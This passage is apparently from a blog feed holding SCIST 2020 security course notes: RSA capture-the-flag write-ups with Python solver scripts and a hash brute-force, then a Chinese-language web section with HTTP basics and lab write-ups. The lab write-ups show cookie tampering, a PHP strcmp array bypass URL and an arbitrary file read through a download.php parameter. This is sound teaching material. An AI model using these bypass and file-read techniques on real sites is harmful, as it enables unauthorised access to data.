44163895521220531459057055795752057167876718238617963549906371036055586914199267109947281359325715489398261335563468559859879340774499726524035061903919328383390193234339356811666801858858748990899697833645511123626735258871404048116302274347058468791179874933001105300534600581977271895856972533976629641765182868484553104584590829347999386472615066779248550781718812068424236647225425670871554757459074630360567280382876137651283102473254886990887517217176132596555364994651622062720390486911698802074418697530462711619997107804919499320409084297665919116751543056038865957808455949742740596859550586982302492545205898434968509344729243293414190715139959127090472661918871372070659935437431160846169010492251366727698703670348564864343164944932175842131148853297549424891479394079434940030257530096990169847176293150870765433888895069248560702669885642923421945661068042034911026426121363007026093515922333722778955975053692081279596854554640425470049534192255739670036469m = gmpy2.iroot(c,e)[0]print(long_to_bytes(m))</code></pre><p>Flag <code>BreakALLCTF{WTF_!$_7h@t_BI@_N...?...MON_DO_I_KNOW_RSA...?}</code></p><h3 id="YANG-RSA-3"><a href="#YANG-RSA-3" class="headerlink" title="YANG_RSA-3"></a>YANG_RSA-3</h3><div class="spoiler collapsed">    <div class="spoiler-title">        problem.txt    </div>    <div class="spoiler-content">        <p>RSA-3-code.py</p><pre class=" language-py"><code class="language-py">from Crypto.Util import numberdef getTwin(n):        while True:                p = number.getPrime(n)                if number.isPrime(p+2):                        return pp = getTwin(1650)q = getTwin(2000)n1 = p * qn2 = (p+2) * (q+2)e = 10000001m = libnum.s2n(open('flag').read().strip())c = pow(pow(m,e,n1),e,n2)with open('output.txt','w') as f:        f.write('c = %d \n\n' % c)        f.write('e = %d \n\n' % e)        f.write('n1 = %d \n\n' % n1)        f.write('n2 = %d \n\n' % n2)</code></pre><p>RSA-3-output.txt</p><pre class=" language-py"><code class="language-py">c = 139042738526108915518382315590614161559545672874231013930043771888153330995636895021496690157019719891495421789891311751114070162820109898550748729125606711558619118645191771802867431417997808791808947663873157450381886576198018116644175503419727838166069179286320364053606871929319609609717883881827703531071294250903725115590903885439257993122448450155592341119519506480784700882637629148100289455951870378287065580019819787172666799064867472787388018501312484677758639630205985303521919625967928777576894714176370710514866851261857421113481579194403231201302648732458813285636116381750742800141620920665296851274731594398742733371863332481364651903565612256089078337832051794479664232703579382433662773172010772985745670472577141377427032667489413571147659184721008370862939384402765999758594739567633919697832750413509665699046792692953501205991502771826582951017086701333243949551066796272454956773817169423364362577405931516463850167131352119912514527378117187253789191465090914208628886222374130328836743075062815304664169005843065539134914179702827261596407513474449624318873499341773097243e = 10000001n1 = 3627444771006641937670374103598493492277170277116493920932885955435916968318288577415856168749785331840818803112714250474056975340846972000039130600885450836486139285287969449202825040685732379632326635633418300048983634209556964867175030252399986593427857865008518171239775643235488954015082260035235036283487660366488550474516338472679222048717177747614210739606052154819639691004286246240020230188651006378959767398084324322008453152063183987372973164598066860174889163715767177543295634165129243441461597670797375484554640164983017774064835500981051070425037996029762438322599385986157913795423953648261358937185717844177379683832237044491180000482549114763268386632780913610754235834240512650659409215396821697752992594864370658750560426230664402293637048067412815299294991452283113777309961811323532557633057727900060941499142193907009891170468728522049291402072655778336976688416252463974783689158463516778651386914053541081481476612718983711795850458476656130316790582555711188904501523691656768916238612527464448411081019203952981305496349455714491843585609791073272252568166553125529140639n2 = 3627444771006641937670374103598493492277170277116493920932885955435916968318288577415856168749785331840818803112714250474056975340846972000039130600885450836486139285287969449202825040685732379632326635633418300048983634209556964867175030252399986593427857865008518171239775643235488954015082260035235036283487660366488550474516338472679222048717177747614210739606052154819639691004286246240020230188651006378959767398084324322008453152063183987372973164598066860174889163715767177543295634165129419489479581992906703549293578307256488898187992353900184420118800322552534062759653705575925115281872928967944090554962523467896972290709767538721152187005614513210255277428624583175610744256739492598420738558920178579717917167080004296928204063086948663685116578675918309866385297630728361719704990361341156140881005762465007490782078136991995257037173077806031411193484423581964394970840431076138212137582851077173111409746242976470913498571389253297470379823689833891657511115618</code></pre>    </div></div><p>This is a <strong>twin prime</strong> problem, which mean if <code>p</code> is a prime, <code>p+2</code> is also a prime.</p><p>You can refer to this slide(P8)：<a href="https://www.slideshare.net/ssuseraba268/rsa-in-ctf">rsa-in-ctf</a></p><pre class=" language-bash"><code class="language-bash">n1 <span class="token operator">=</span> p*qn2 <span class="token operator">=</span> <span class="token punctuation">(</span>p+2<span class="token punctuation">)</span>*<span class="token punctuation">(</span>q+2<span class="token punctuation">)</span> <span class="token operator">=</span> pq + 2<span class="token punctuation">(</span>p+q<span class="token punctuation">)</span> + 42<span class="token punctuation">(</span>p+q<span class="token punctuation">)</span> <span class="token operator">=</span> n2 - pq - 4p+q <span class="token operator">=</span> <span class="token punctuation">(</span>n2 - pq - 4<span class="token punctuation">)</span>//2phi1 <span class="token operator">=</span> <span class="token punctuation">(</span>p-1<span class="token punctuation">)</span>*<span class="token punctuation">(</span>q-1<span class="token punctuation">)</span> <span class="token operator">=</span> pq - <span class="token punctuation">(</span>p+q<span class="token punctuation">)</span> + 1 <span class="token operator">=</span> n1 - <span class="token punctuation">(</span>p+q<span class="token punctuation">)</span> + 1phi2 <span class="token operator">=</span> <span class="token punctuation">(</span>p+1<span class="token punctuation">)</span>*<span class="token punctuation">(</span>q+1<span class="token punctuation">)</span> <span class="token operator">=</span> pq + <span class="token punctuation">(</span>p+1<span class="token punctuation">)</span> + 1 <span class="token operator">=</span> n1 + <span class="token punctuation">(</span>p+q<span class="token punctuation">)</span> + 1</code></pre><pre class=" language-py"><code class="language-py">from Crypto.Util.number import *c = 139042738526108915518382315590614161559545672874231013930043771888153330995636895021496690157019719891495421789891311751114070162820109898550748729125606711558619118645191771802867431417997808791808947663873157450381886576198018116644175503419727838166069179286320364053606871929319609609717883881827703531071294250903725115590903885439257993122448450155592341119519506480784700882637629148100289455951870378287065580019819787172666799064867472787388018501312484677758639630205985303521919625967928777576894714176370710514866851261857421113481579194403231201302648732458813285636116381750742800141620920665296851274731594398742733371863332481364651903565612256089078337832051794479664232703579382433662773172010772985745670472577141377427032667489413571147659184721008370862939384402765999758594739567633919697832750413509665699046792692953501205991502771826582951017086701333243949551066796272454956773817169423364362577405931516463850167131352119912514527378117187253789191465090914208628886222374130328836743075062815304664169005843065539134914179702827261596407513474449624318873499341773097243e = 10000001n1 = 3627444771006641937670374103598493492277170277116493920932885955435916968318288577415856168749785331840818803112714250474056975340846972000039130600885450836486139285287969449202825040685732379632326635633418300048983634209556964867175030252399986593427857865008518171239775643235488954015082260035235036283487660366488550474516338472679222048717177747614210739606052154819639691004286246240020230188651006378959767398084324322008453152063183987372973164598066860174889163715767177543295634165129243441461597670797375484554640164983017774064835500981051070425037996029762438322599385986157913795423953648261358937185717844177379683832237044491180000482549114763268386632780913610754235834240512650659409215396821697752992594864370658750560426230664402293637048067412815299294991452283113777309961811323532557633057727900060941499142193907009891170468728522049291402072655778336976688416252463974783689158463516778651386914053541081481476612718983711795850458476656130316790582555711188904501523691656768916238612527464448411081019203952981305496349455714491843585609791073272252568166553125529140639n2 = 3627444771006641937670374103598493492277170277116493920932885955435916968318288577415856168749785331840818803112714250474056975340846972000039130600885450836486139285287969449202825040685732379632326635633418300048983634209556964867175030252399986593427857865008518171239775643235488954015082260035235036283487660366488550474516338472679222048717177747614210739606052154819639691004286246240020230188651006378959767398084324322008453152063183987372973164598066860174889163715767177543295634165129419489479581992906703549293578307256488898187992353900184420118800322552534062759653705575925115281872928967944090554962523467896972290709767538721152187005614513210255277428624583175610744256739492598420738558920178579717917167080004296928204063086948663685116578675918309866385297630728361719704990361341156140881005762465007490782078136991995257037173077806031411193484423581964394970840431076138212137582851077173111409746242976470913498571389253297470379823689833891657511115618469031966199517813387433692841129826086480794218247482240815273496487448622735466819104529863148460012391153385059278883pq = (n2 - n1 - 4)//2phi1 = n1 - pq +1phi2 = n1 + pq +1d1 = inverse(e,phi1)d2 = inverse(e,phi2)m2 = pow(c,d2,n2)m1 = pow(m2,d1,n1)print(long_to_bytes(m1))</code></pre><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><p>This problem gives pub_key <code>pub.pem</code> and ciphertext <code>flag.enc</code></p><p>About how to read these two files:</p><pre class=" language-py"><code class="language-py">from Crypto.PublicKey.RSA import importKeykey=importKey(open("pub.pem","rb").read())n=key.ne=key.eenc = open('flag.enc','rb').read()c = int(enc.hex(), 16)</code></pre><p>So now we got <code>n``e``c</code>, we can solve this basic RSA problem.</p><p>sol.py</p><pre class=" language-py"><code class="language-py">from Crypto.Util.number import *from Crypto.PublicKey.RSA import importKeykey = importKey(open("pub.pem","rb").read())n = key.ne = key.eenc = open("flag.enc","rb").read()c = int(enc.hex(),16)p = 270613060120468613971049355250995010949q = n//pphi = (p-1)*(q-1)d = inverse(e,phi)m = pow(c,d,n)print(long_to_bytes(m))</code></pre><p>FLAG <code>BreakALLCTF{b@$RSA}</code></p><h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><h3 id="AIS3-Pre-exam-2015-Crypto2"><a href="#AIS3-Pre-exam-2015-Crypto2" class="headerlink" title="AIS3_Pre_exam_2015-Crypto2"></a>AIS3_Pre_exam_2015-Crypto2</h3><p>It gave a <code>tgz</code> file, so we need to unzip it first.<br><code>tar zxvf crypto2.tgz</code><br>We got two file：<code>flag.enc</code> and <code>rsa.py</code></p><p>read <code>flag.enc</code> as enc(bytes), then convert bytes into int</p><pre class=" language-py"><code class="language-py">enc = open('flag.enc','rb').read()c = int(enc.hex(), 16)</code></pre><div class="spoiler collapsed">    <div class="spoiler-title">        rsa.py    </div>    <div class="spoiler-content">        <pre class=" language-py"><code class="language-py">import rsan = 66473473500165594946611690873482355823120606837537154371392262259669981906291e = 65537PUBKEY = rsa.PublicKey(n, e)def encrypt(s, pubkey):        return rsa.encrypt( s, pubkey )if __name__ == '__main__':        with open('flag.txt', 'r') as fp:                flag = fp.read()        with open('flag.enc', 'w') as fp:                fp.write( encrypt(flag, PUBKEY) )</code></pre>    </div></div><p>By using factordb, we can get <code>p</code> and <code>q</code></p><pre class=" language-py"><code class="language-py">from Crypto.Util.number import *p =  800644567978575682363895000391634967q =  83024947846700869393771322159348359271173n = p*qe = 65537enc = open('flag.enc','rb').read()c = int(enc.hex(), 16)phi = (p-1)*(q-1)d = inverse(e,phi)m = pow(c,d,n)print(long_to_bytes(m))</code></pre><p>Flag <code>AIS3{rsaaaaaaaaA_orz}</code></p><h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><h3 id="RSA後門-1"><a href="#RSA後門-1" class="headerlink" title="RSA後門(1)"></a>RSA後門(1)</h3><div class="spoiler collapsed">    <div class="spoiler-title">        problem    </div>    <div class="spoiler-content">        <p>這是一個RSA 的題目，提供一個後門給你，你能否解密呢?<br>提示1:<a href="https://simple.wikipedia.org/wiki/Modular_arithmetic">RSA 模運算觀念</a><br>提示2: <a href="http://wsfdl.com/algorithm/2016/02/11/%E7%90%86%E8%A7%A3RSA%E7%AE%97%E6%B3%95.html">Fermat-euler theorem</a></p><pre class=" language-bash"><code class="language-bash">n <span class="token operator">=</span> 760070912350840319011516178942471824408271276603018122766107466458905659805366910876741133101064132968975290327141913870064382857896676965896339499301686289349478192042225387715815300890772726396671069777379993317290403468858998199888875329375096856205675179863574081470688602128633185902300536380591686253782626310388376732381905094112550405708724116437892957067685087277238106233348311268725082471734753857194847838970086800848099069387690801700501505622593836970903856921989336476413802534078525413311063453348054161408156303570666333425678334142525184422436235677229592264286240481233065103525594733333609350428196011268071126676023443256564227488106063073893805882904030218186925942692848016877882566240601003792167543787342287123520711449083265386813671510310650585456131441220450039511889734856795425972738718472877437781909089006687000385532764327586589650518853864825005505232375529254511923368560433385960598232647516144607822711918385784586608803888123523660880157194471094579495414720939362559417376095025821133997982361566429601158965282863289774835745836514384219847770664031196660782737380240398358478721495348483958183701077510621561366810555045657804658889409015678773329196458757404769771384361180527520601391357800258141800488661477548160080188323687255844523623758493111371703516522245476661361074371234254770474249888532163823739762576169486427817071850060196906194007205553628806031759720577392913205266258974893510396850982203198212807648844222854214722691172053026220943259272390113639543712309874760232956983371190047789729422160337209334177864706118802632248174293863932718038360834909893547570166552708085714105225222230703430768672212375445000147155804641468351838745755024401386395525712050470895155325019568159034388240484857157405320152956355210692650494136549140160597175749e <span class="token operator">=</span> 65537c <span class="token operator">=</span> 23043402590987555987470005871777877151151322716060092459929038792187374705968922913981882558830225470321029330756473052187571435747992606303872345391192250986189523554344860876217195521571582376245238947762932906008745950998260974696231231824601028638289006875327541511759557000571143570848503096379667666967042396170909355179367747237803420662010299628257013342744836612954085028392265365961440279234959713291284949713775237855329413455655772310421877970592292542102538256515263604910522531928228880078584842456141579974665432527149970116608055188948668252221996589209114900583773037478077453666787948360947075322921408423852746262833539233406967548960178792506005300931929791663889585748150722426246846945324183653314928671217591271109921760823893150502841856609499818424934712192715672939108605032696495577793313699830025230983849952517890751090570666447986086847837086779757192278809702226557559967552406759613743288491173421943288898163371672471990115969010871440555604481217266874916781598035536414979414464006324273200204670733327544831907946399527743271591693219872979511671485433003231621892498425559325421320388096593342519672705301186660848415575840192111782413754304841694673552200242842522814616994132736554544962232150040663460968513256281961794248016394841074724067661800839577955360386734635675931880822030409894997770620409228346807030968725967258287589342081617955999751395789800908644912870435347895906209405598557569815132825199794518175327458521867303551685164794679068776727276119468526737538107724423172989004606420592240046923867223729763034260869375338820559888057264343970350523466971697923158383084508306076913151571967057252009643027901618887695230860718585529467899380034905236786873876780870273574985011685074373247696219994297416533789436191368362809767858885056459978807647d^2*e + 7phi <span class="token operator">=</span> 1620126254178307107805925347409210109079418631271539038205383853825500296811505131321875475715376307920981259462614357533466941753203754184389902040317390296735523174111832078921071210983364802271706444506677317213375748433529142733682590086434843883159602424571840661084006789837565204356906806127384353403137070496607341705255529168928432860284811151663733497947457852894849483010205070190430044884550533111192278310167522337536246523319753834614895078829866621645079609537944800585691132921447071067406128053795992296555789860705164267117376403341249194265381912880381122911987670787720090648797468392804379581428828927625443096354958698305106425356304804759341769351628590201355981787898026961417197010017978586896498369566391766916389949150734429923140437868014851873995161973857943326484813660496439427382145248573160747328757222766985442936636962614338471082462176542018466676085655454126951355550126361556257104662075266568603316336712255778109160502274520531194415105288138253088913783390737905518421815608069570180353522268625980073518750189827406619294497755771287793106258255192904299584048308228213978894683176026406779635394795370495734518744326300256193256380087951019044375347232461900888446065009489097640645391262386569608187845289178411183302612154855933859365795959462296302969045375802007650006363182447142282246172159815897175833698776663254485330016779371149328376513575569112760942981544834502925172841196048299545002337578813030918604554192291352785887470669511311646710910107563532165621630764987769666815016543655079038651842299906822911300266765706794298700862048041414816161796925300877951583684498109038799176817515156155043226336378501966674335980213598353300400499799267983331829293506615875633931684214060079961057050811529994328542272465237370490978257671901267949207368118469813482528549191337691272398251984525988911374674261415802154066814829811852235633680796855638371608427840349392807069113908188523610318541628405008514061483659101476049254558271853247155909822423178322733169352572052726772582248896209811295644754652929887794307253538519583308522548764807171997390978930362807674618922673784345674399280165757903254849166255862761505958877746491695638693225723742471994074977722764774396977099203362493734497024157950664679560033045482790511829641981266050781145047063439829017411287025152601657710843117158464125963489235207735032378012469116305985018154124770869140988608396527280659847552980183759392006298043098302142036369831264210519529460144456046718107048666133409389414971293612254496187041396109788710182456978219643383191376104152139390281682725843970462663476429188678725076567909771351453134707771292457507252653887820906120220438288603368324527890395568883849113861497960739320824870111660002336940925676213182090142135460146471543405919951993709743278922880730501901447471415221734066265696076586382009664274086330323532584722108261464690626012127056796760247870942832409248150162628837118556643673490483508340076601494462894830031383023978791318416731750735151837937806847488275195597134674111405788736045846451812924630643394346576798523225002203801819682823374228410113250193049149956290221614268899002507311843085666803688279048710674142634342181537227528937600806325860076859203781668984084015772848021783541825345156247897291696817517617346614862474694333096308102196024040585991378871897997839002740030027319532462250477445464847537717734353083321981680750712108267543263803466885591366936121859171083424502493973267513173320411368750946440514079437531574281488938077212799745537360636372874039590628648466074136236105865275970476148518382544665640833</code></pre>    </div></div><p><code>d^2*e + 7phi</code><br>As we know <code>phi == 0 (mod phi) </code> and <code>e*d == 1 (mod phi)</code><br><code>d^2*e + 7phi = d*d*e + 0 = d*1 = d</code></p><pre class=" language-py"><code class="language-py">from Crypto.Util.number import *n = 760070912350840319011516178942471824408271276603018122766107466458905659805366910876741133101064132968975290327141913870064382857896676965896339499301686289349478192042225387715815300890772726396671069777379993317290403468858998199888875329375096856205675179863574081470688602128633185902300536380591686253782626310388376732381905094112550405708724116437892957067685087277238106233348311268725082471734753857194847838970086800848099069387690801700501505622593836970903856921989336476413802534078525413311063453348054161408156303570666333425678334142525184422436235677229592264286240481233065103525594733333609350428196011268071126676023443256564227488106063073893805882904030218186925942692848016877882566240601003792167543787342287123520711449083265386813671510310650585456131441220450039511889734856795425972738718472877437781909089006687000385532764327586589650518853864825005505232375529254511923368560433385960598232647516144607822711918385784586608803888123523660880157194471094579495414720939362559417376095025821133997982361566429601158965282863289774835745836514384219847770664031196660782737380240398358478721495348483958183701077510621561366810555045657804658889409015678773329196458757404769771384361180527520601391357800258141800488661477548160080188323687255844523623758493111371703516522245476661361074371234254770474249888532163823739762576169486427817071850060196906194007205553628806031759720577392913205266258974893510396850982203198212807648844222854214722691172053026220943259272390113639543712309874760232956983371190047789729422160337209334177864706118802632248174293863932718038360834909893547570166552708085714105225222230703430768672212375445000147155804641468351838745755024401386395525712050470895155325019568159034388240484857157405320152956355210692650494136549140160597175749e = 65537c = 23043402590987555987470005871777877151151322716060092459929038792187374705968922913981882558830225470321029330756473052187571435747992606303872345391192250986189523554344860876217195521571582376245238947762932906008745950998260974696231231824601028638289006875327541511759557000571143570848503096379667666967042396170909355179367747237803420662010299628257013342744836612954085028392265365961440279234959713291284949713775237855329413455655772310421877970592292542102538256515263604910522531928228880078584842456141579974665432527149970116608055188948668252221996589209114900583773037478077453666787948360947075322921408423852746262833539233406967548960178792506005300931929791663889585748150722426246846945324183653314928671217591271109921760823893150502841856609499818424934712192715672939108605032696495577793313699830025230983849952517890751090570666447986086847837086779757192278809702226557559967552406759613743288491173421943288898163371672471990115969010871440555604481217266874916781598035536414979414464006324273200204670733327544831907946399527743271591693219872979511671485433003231621892498425559325421320388096593342519672705301186660848415575840192111782413754304841694673552200242842522814616994132736554544962232150040663460968513256281961794248016394841074724067661800839577955360386734635675931880822030409894997770620409228346807030968725967258287589342081617955999751395789800908644912870435347895906209405598557569815132825199794518175327458521867303551685164794679068776727276119468526737538107724423172989004606420592240046923867223729763034260869375338820559888057264343970350523466971697923158383084508306076913151571967057252009643027901618887695230860718585529467899380034905236786873876780870273574985011685074373247696219994297416533789436191368362809767858885056459978807647d = 1620126254178307107805925347409210109079418631271539038205383853825500296811505131321875475715376307920981259462614357533466941753203754184389902040317390296735523174111832078921071210983364802271706444506677317213375748433529142733682590086434843883159602424571840661084006789837565204356906806127384353403137070496607341705255529168928432860284811151663733497947457852894849483010205070190430044884550533111192278310167522337536246523319753834614895078829866621645079609537944800585691132921447071067406128053795992296555789860705164267117376403341249194265381912880381122911987670787720090648797468392804379581428828927625443096354958698305106425356304804759341769351628590201355981787898026961417197010017978586896498369566391766916389949150734429923140437868014851873995161973857943326484813660496439427382145248573160747328757222766985442936636962614338471082462176542018466676085655454126951355550126361556257104662075266568603316336712255778109160502274520531194415105288138253088913783390737905518421815608069570180353522268625980073518750189827406619294497755771287793106258255192904299584048308228213978894683176026406779635394795370495734518744326300256193256380087951019044375347232461900888446065009489097640645391262386569608187845289178411183302612154855933859365795959462296302969045375802007650006363182447142282246172159815897175833698776663254485330016779371149328376513575569112760942981544834502925172841196048299545002337578813030918604554192291352785887470669511311646710910107563532165621630764987769666815016543655079038651842299906822911300266765706794298700862048041414816161796925300877951583684498109038799176817515156155043226336378501966674335980213598353300400499799267983331829293506615875633931684214060079961057050811529994328542272465237370490978257671901267949207368118469813482528549191337691272398251984525988911374674261415802154066814829811852235633680796855638371608427840349392807069113908188523610318541628405008514061483659101476049254558271853247155909822423178322733169352572052726772582248896209811295644754652929887794307253538519583308522548764807171997390978930362807674618922673784345674399280165757903254849166255862761505958877746491695638693225723742471994074977722764774396977099203362493734497024157950664679560033045482790511829641981266050781145047063439829017411287025152601657710843117158464125963489235207735032378012469116305985018154124770869140988608396527280659847552980183759392006298043098302142036369831264210519529460144456046718107048666133409389414971293612254496187041396109788710182456978219643383191376104152139390281682725843970462663476429188678725076567909771351453134707771292457507252653887820906120220438288603368324527890395568883849113861497960739320824870111660002336940925676213182090142135460146471543405919951993709743278922880730501901447471415221734066265696076586382009664274086330323532584722108261464690626012127056796760247870942832409248150162628837118556643673490483508340076601494462894830031383023978791318416731750735151837937806847488275195597134674111405788736045846451812924630643394346576798523225002203801819682823374228410113250193049149956290221614268899002507311843085666803688279048710674142634342181537227528937600806325860076859203781668984084015772848021783541825345156247897291696817517617346614862474694333096308102196024040585991378871897997839002740030027319532462250477445464847537717734353083321981680750712108267543263803466885591366936121859171083424502493973267513173320411368750946440514079437531574281488938077212799745537360636372874039590628648466074136236105865275970476148518382544665640833m = pow(c,d,n)print(long_to_bytes(m))</code></pre><p>Flag <code>BreakALLCTF{__Crypto?_M@7h?__just_calculate~}</code></p><h3 id="AIS3-Pre-exam-2015-Crypto3"><a href="#AIS3-Pre-exam-2015-Crypto3" class="headerlink" title="AIS3_Pre_exam_2015-Crypto3(*)"></a>AIS3_Pre_exam_2015-Crypto3(*)</h3><p>It gave a <code>tbz</code> file, so we need to unzip it first.<br><code>tar -jxvf crypto3.tbz</code><br>Now we can see </p><h2 id="Homework"><a href="#Homework" class="headerlink" title="Homework"></a>Homework</h2><h3 id="Hash-Encrypt"><a href="#Hash-Encrypt" class="headerlink" title="Hash Encrypt"></a>Hash Encrypt</h3><p><code>res=(''.join([sha384(c.encode()).hexdigest()[:5] for c in FLAG ]))</code> is list comprehension in python<br>sha384 every character and keep first five characters of the result</p><p>Since the same character has the same result and there are less than 100 printable character, we can brute force every printable character and compare to the result.</p><pre class=" language-py"><code class="language-py">from hashlib import sha384from string import printable#FLAG="BreakAllCTF{}"#res=(''.join([sha384(c.encode()).hexdigest()[:5] for c in FLAG ]))res = "8a5e675d378d18254a5981deaad14a1ad0e1ad0e95ed472df8bcf6e5335f72df8586b017580a87d840f985f9158ac1075823758237582375823000f40b759a4eb0bcf6ec2b14000f41d0ec17580a87d8f99c575d37883c5049e7e7cdc1d0ec000f41f366"#split output spdef split(s, n):    if len(s) < n:        return []    else:        return [s[:n]] + split(s[n:], n)sp=split(res, 5)#print(sp)#table hs=""for c in printable:    s+=sha384(c.encode()).hexdigest()[:5]h=split(s, 5)#print(h)#output comparisonFLAG=""for i in sp:    time=0    for j in h:        if(i==j):            FLAG+=printable[time]            break        time+=1print(FLAG)#print(len(FLAG))</code></pre><p>Flag <code>BreakAll{H4sH_Enc0d....?Wh47?!En6rypt!?}</code></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> SCIST </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Note </tag>
            
            <tag> SCIST </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 SCIST Security Note - Web</title>
      <link href="/2020/11/07/2020-SCIST-Security-Note-Web/"/>
      <url>/2020/11/07/2020-SCIST-Security-Note-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h1><h2 id="Web-Intro"><a href="#Web-Intro" class="headerlink" title="Web Intro"></a>Web Intro</h2><p>Web：用瀏覽器去瀏覽的網站/網頁<br>目的：了解底下的運作</p><p>輸入網址-&gt;出現網頁<br>Ex.<a href="https://lab.djosix.com/">https://lab.djosix.com</a></p><ol><li>解析 url</li></ol><ul><li>https 資料會被加密的 http</li><li>主機名稱對應到的 IP (問 DNS Server)</li><li>連線到IP位址的某個port<br>  (Ex.http -&gt; port80 ; https -&gt; port443)</li><li>一個主機上面會有很多個port (0 ~ 65535)</li><li>伺服器可以在很多個port上面開監聽者，等待使用者點進來</li></ul><ol start="2"><li>建立TCP連線</li></ol><ul><li>加密 傳送HTTP請求的格式</li><li>伺服器解析請求格式 -&gt; 瀏覽器拿哪個檔案</li></ul><p><img src="https://i.imgur.com/WVDcL7w.png"></p><p>至少需要前面兩行伺服器就可以知道你請求什麼檔案以及你利用哪個主機傳送</p><pre class=" language-html"><code class="language-html">GET / HTTP/1.1Host: lab.djosix.com</code></pre><p>伺服器收到後就會去找你請求的檔案<br>若沒有找到你要的檔案<br>就會去找<code>index.html</code></p><p><img src="https://i.imgur.com/MHQuhSY.png"></p><p>接著瀏覽器就會把內容畫到網頁上</p><p><img src="https://i.imgur.com/Yu7sJxQ.png"></p><p>按 F12 可以看到開發者模式<br><code>Request Headers</code> -&gt;瀏覽器傳了什麼給伺服器<br><code>Response Headers</code> -&gt;伺服器回傳什麼給使用者</p><p>或是用指令看-&gt;<code>curl</code></p><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p><code>curl [url]</code></p><p><code>curl -v [url]</code> / <code>curl [url] -vvv</code> 可以看到更詳細的網頁底層，在上面做任意的HTP request</p><p>response 的通常是 200 OK<br>如果出現<code>301 moved permanently</code>或<code>302 Found</code>代表點開那個網址之後會傳送到下面<code>Location:</code>的網址</p><p><img src="https://i.imgur.com/LAK6dBZ.jpg"></p><h4 id="Headers"><a href="#Headers" class="headerlink" title="Headers"></a>Headers</h4><p><code>&gt;</code>是瀏覽器傳了什麼給伺服器<br><code>&lt;</code>是伺服器回傳什麼給使用者</p><h4 id="Body"><a href="#Body" class="headerlink" title="Body"></a>Body</h4><p>網頁內容</p><h3 id="開法者模式F12"><a href="#開法者模式F12" class="headerlink" title="開法者模式F12"></a>開法者模式F12</h3><p>element 的 block 裡面如果有<code>readonly</code>就代表該 block 不能在頁面上直接改</p><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p><code>action</code> 按下表單之後會送到那個檔案裏面</p><p><code>echo</code> -&gt; print</p><p><code>echo 字串 . 字串</code> -&gt; 把兩個字串接在一起</p><p><code>var_dump</code>-&gt; 可以print PHP的任何物件然後排版</p><p><code>--</code>-&gt; 單行註解</p><p><code>null</code> 在PHP裡面==0 </p><p><code>==</code> 會先把左右兩邊都換成同樣的類型再去判斷 (ex.<code>NULL</code>會被轉成 int 而變成 0 )</p><p><code>===</code> 就會要求左右兩邊都要是同樣的類型</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="KAIBRO-BUY"><a href="#KAIBRO-BUY" class="headerlink" title="KAIBRO BUY"></a>KAIBRO BUY</h3><blockquote><p><a href="http://140.110.112.78:2500/">http://140.110.112.78:2500/</a></p></blockquote><p>F12 修改element</p><h3 id="Level"><a href="#Level" class="headerlink" title="Level"></a>Level</h3><blockquote><p><a href="http://140.110.112.78:25501/">http://140.110.112.78:25501/</a></p></blockquote><p>從 cookies 把 Level 的 volue 改成 1000 就可以了(點兩下可以改)</p><h3 id="Secret-Login"><a href="#Secret-Login" class="headerlink" title="Secret Login"></a>Secret Login</h3><blockquote><p><a href="http://140.110.112.78:2502/">http://140.110.112.78:2502/</a></p></blockquote><p>可以看有甚麼東西丟進去 strcmp 會變成 0<br><a href="https://www.php.net/manual/en/function.strcmp.php">PHP strcmp</a></p><p><code>http://140.110.112.78:2502/?pass[]=hijnk&amp;secret=45645</code></p><h3 id="Downloader"><a href="#Downloader" class="headerlink" title="Downloader"></a>Downloader</h3><blockquote><p><a href="http://140.110.112.78:2505/">http://140.110.112.78:2505/</a></p></blockquote><p>先看一下網頁的原始碼</p><p>會看到 <code>http://140.110.112.78:2505/download.php?f=cute1.jpg</code></p><p>可以猜測是 download.php 會去讀 f 的參數</p><p>所以可以看看 f 有甚麼其他的可以讀</p><p>像是<code>curl http://140.110.112.78:2505/download.php?f=download.php</code></p><p>從第一行<code>$file = $_GET['f'];</code>能夠知道他會去讀f的值</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Description: File Transfer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: application/octet-stream'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Disposition: attachment; filename="'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Expires: 0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Cache-Control: must-revalidate'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Pragma: public'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Length: '</span> <span class="token punctuation">.</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token 